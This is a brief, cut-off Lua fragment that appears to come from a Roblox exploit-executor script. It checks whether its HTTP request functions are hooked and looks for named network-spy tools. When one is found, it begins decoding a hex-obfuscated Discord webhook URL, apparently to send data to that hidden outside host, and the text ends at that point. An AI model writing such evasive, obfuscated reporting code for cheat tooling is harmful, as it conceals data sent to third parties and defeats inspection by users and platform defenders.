local function _0xH(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local _L = game:GetService("Players").LocalPlayer
local _H = game:GetService("HttpService")

local function _SC()
    if not _req then return false end
    local ok, info = pcall(debug.getinfo, _req)
    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
    if debug.getinfo(game.HttpGet).source ~= "=[C]" then return "HOOKED_HTTPGET" end
    local cg = game:GetService("CoreGui")
    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_FOUND_" .. n end
    end
    return false
end

local _se = _SC()
if _se then
    local _A = _0xH("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313531383333343033
